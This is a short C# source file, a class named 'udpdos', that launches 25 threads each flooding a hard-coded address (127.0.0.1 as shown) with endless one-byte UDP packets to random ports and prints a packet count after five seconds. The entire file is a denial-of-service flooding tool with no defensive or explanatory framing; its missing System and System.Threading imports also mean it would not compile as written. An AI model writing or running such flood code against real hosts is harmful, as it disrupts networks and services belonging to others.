using System.Collections.Generic;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Timers;


//Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

//IPAddress broadcast = IPAddress.Parse("127.0.0.1");
public class udpdos
{
    public static int count = 0;
    public static byte[] sendbuf = Encoding.ASCII.GetBytes(" ");
    public static string ipaddr = "127.0.0.1";
    public static Random rnd = new Random();
    public static UdpClient udpClient = new UdpClient(new IPEndPoint(IPAddress.Any, 0));

    public static void Main(string[] args)
    {
        startThreads();
        Thread temp = new Thread(new ThreadStart(timer));
        temp.Start();
        
    }
    public static void scream()
    {
        try
        {
            while (true)
            {
                int port = rnd.Next(1000, 65535);
                udpClient.Send(sendbuf, sendbuf.Length, ipaddr, port);
                count++;
            }
        }
        catch (Exception e)
        {
            Thread.Sleep(100);
            Console.WriteLine(e.ToString());
        }

    }
    public static void timer()
    {
        Thread.Sleep(5000);
        Console.WriteLine(count);
    }
    public static void startThreads()
    {
        for (int i = 0; i < 25; i++)
        {
            Thread listenThread = new Thread(new ThreadStart(scream));
            listenThread.Start();
        }

    }

}
